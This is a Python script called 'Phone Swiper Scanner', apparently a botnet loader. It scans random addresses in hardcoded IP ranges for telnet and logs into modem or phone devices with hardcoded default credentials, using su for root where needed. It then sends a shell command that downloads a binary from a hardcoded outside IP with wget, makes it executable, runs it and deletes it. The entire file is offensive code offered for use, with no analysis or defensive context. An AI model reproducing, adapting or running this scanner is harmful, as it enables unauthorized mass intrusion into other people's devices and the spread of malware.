#!/usr/bin/python
# Phone Swiper Scanner 
 
import threading, sys, time, random, socket, re, os
 
if len(sys.argv) < 3:
    print "Phone Swiper Scanner\n"
    print "Usage: python "+sys.argv[0]+" <threads(1-100+)> <ips(1-1000+)>"
    sys.exit()
 
usernames = ["root", "admin"]
passwords = ["oelinux123", "admin"]
url = "http://103.194.169.245/tftp" # ARM4 Bin
threads = int(sys.argv[1])
ipz = int(sys.argv[2])
Tranges = ["119.150","119.151","119.152","119.153","119.154","119.155","119.156","119.157","119.158","119.159","182.184","182.185","182.186","182.187","182.188","182.189","182.190","182.191"]
 
def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')
 
def worker():
    try:
        print "\033[33mStarting Telnet Thread\033[37m"
        while True:
            try:
                h0h0h0 = h0h0 + 1
                br2 = random.choice(Tranges)
                for x in xrange(h0h0h0):
                    try:
                        ip = ''+br2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                        t = telnet(ip)
                        t.start()
                        time.sleep(0.009)
                    except:
                        pass
                time.sleep(2)
            except:
                print "\033[31mWORKER ERROR\033[37m"
                pass
    except:
        pass
 
class telnet(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
            self.ip = str(ip).rstrip('\n')
        def run(self):
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip,23))
            except Exception:
                pass
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if "mdm9625" in hoho:
                    r00t = 0
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "9615-cdp" in hoho:
                    r00t = 1
                    username = usernames[0]
                    password = passwords[0]
                    tn.send(username + "\n")
            except Exception:
                pass
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(3.5)
            except Exception:
                pass
            try:
                mp = ''
                mp += tn.recv(1024)
                if "#" in mp or "$" in mp or "~" in mp or ">" in mp or "root@" in mp: # !DO NOT CHANGE ANYTHING! #
                    if r00t: tn.send("cd /tmp; rm -rf phone; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[32m[PHONE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
                    if not r00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[32m[PHONE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
            except Exception:
                pass
 
for g in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
        time.sleep(0.002)
    except:
        pass